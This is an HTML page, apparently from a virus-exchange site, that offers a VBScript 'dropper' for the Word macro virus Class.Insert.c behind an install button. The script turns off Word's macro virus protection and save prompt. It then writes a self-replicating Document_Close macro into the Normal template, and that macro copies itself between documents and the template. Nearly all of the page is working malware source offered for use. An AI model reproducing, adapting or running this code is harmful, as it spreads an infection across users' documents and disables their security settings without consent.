<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="GENERATOR" content="Microsoft FrontPage Express 2.0">
<title></title>
</head>

<body>

<p>&nbsp;</p>

<p align="center">The HTML version of VBS Class.Insert.c dropper</p>

<p align="center"><a
href="http://www.geocities.com/SiliconValley/Horizon/9386">1nternal's
VX Site</a></p>

<p align="center"><input type="button" name="ButtonA"
value="1nstall Class.Insert.c"></p>

<p align="center"><script language="VBScript"><!--
Sub ButtonA_OnClick

ByeMsg_Text	   = "1nstalled!"
ByeMsg_Title	= "Class.Insert.c"

Dim objWord
Set objWord = CreateObject("Word.Application")
Set NT = objWord.Templates(1).VBProject.VBComponents(1).CodeModule

objWord.Options.SaveNormalPrompt = False
objWord.Options.VirusProtection = False

NT.InsertLines 1, "Private Sub Document_Close()"
NT.InsertLines 2, "'1nternal"
NT.InsertLines 3, "On Error GoTo Break"
NT.InsertLines 4, "Set A = ActiveDocument.VBProject.VBComponents(1).CodeModule"
NT.InsertLines 5, "Set N = NormalTemplate.VBProject.VBComponents(1).CodeModule"
NT.InsertLines 6, "Options.VirusProtection = False"
NT.InsertLines 7, "Options.ConfirmConversions = False"
NT.InsertLines 8, "Options.SaveNormalPrompt = False"
NT.InsertLines 9, "If N.Lines(2, 1) = " + Chr(34) + "'1nternal" + Chr(34) + " Then GoTo CheckA"
NT.InsertLines 10, "For I = 1 To 19"
NT.InsertLines 11, "N.InsertLines I, A.Lines(I, 1)"
NT.InsertLines 12, "Next I"
NT.InsertLines 13, "CheckA:"
NT.InsertLines 14, "If A.Lines(2, 1) = " + Chr(34) + "'1nternal" + Chr(34) + " Then GoTo Break"
NT.InsertLines 15, "For I = 1 To 19"
NT.InsertLines 16, "A.InsertLines I, N.Lines(I, 1)"
NT.InsertLines 17, "Next I"
NT.InsertLines 18, "Break:"
NT.InsertLines 19, "End Sub"

Set NT = Nothing
objWord.application.quit
Done = MsgBox (ByeMsg_Text,,ByeMsg_Title)

End Sub
--></script></p>
</body>
</html>
